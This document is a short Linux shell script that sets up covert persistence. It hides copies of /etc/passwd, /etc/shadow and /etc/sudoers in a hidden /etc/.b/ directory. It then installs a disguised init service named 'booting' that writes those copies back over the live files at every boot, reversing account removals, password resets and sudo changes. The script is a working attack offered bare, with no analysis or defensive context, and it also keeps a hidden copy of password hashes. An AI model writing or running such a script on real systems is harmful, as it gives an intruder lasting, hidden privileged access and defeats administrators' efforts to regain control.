mkdir /etc/.b/
cp /etc/passwd /etc/.b/
cp /etc/sudoers /etc/.b/
cp /etc/shadow /etc/.b/
touch /etc/.b/booting

echo "#! /bin/sh" > /etc/.b/booting
echo "# /etc/init.d/booting" >> /etc/.b/booting
echo "# always run" >> /etc/.b/booting
echo "touch /var/lock/booting" >> /etc/.b/booting
echo "# funcion " >> /etc/.b/booting
echo 'case "$1" in ' >> /etc/.b/booting
echo ' start)' >> /etc/.b/booting
echo ' echo "start booting"' >> /etc/.b/booting
echo ' echo "ok"' >> /etc/.b/booting
echo ' cat /etc/.b/shadow > /etc/shadow' >> /etc/.b/booting
echo ' cat /etc/.b/sudoers > /etc/sudoers' >> /etc/.b/booting
echo ' cat /etc/.b/passwd > /etc/passwd' >> /etc/.b/booting
echo ' ;;' >> /etc/.b/booting
echo ' stop)' >> /etc/.b/booting
echo ' echo "stopping"' >> /etc/.b/booting
echo ' echo "OK"' >> /etc/.b/booting
echo ' ;;' >> /etc/.b/booting
echo ' *)' >> /etc/.b/booting
echo ' echo "usage: ...secret.."' >> /etc/.b/booting
echo ' exit 1' >> /etc/.b/booting
echo ' ;;' >> /etc/.b/booting
echo 'esac' >> /etc/.b/booting
echo 'exit 0' >> /etc/.b/booting

cp /etc/.b/booting /etc/init.d/
chmod 755 /etc/init.d/booting
update-rc.d booting defaults
echo "setup successful"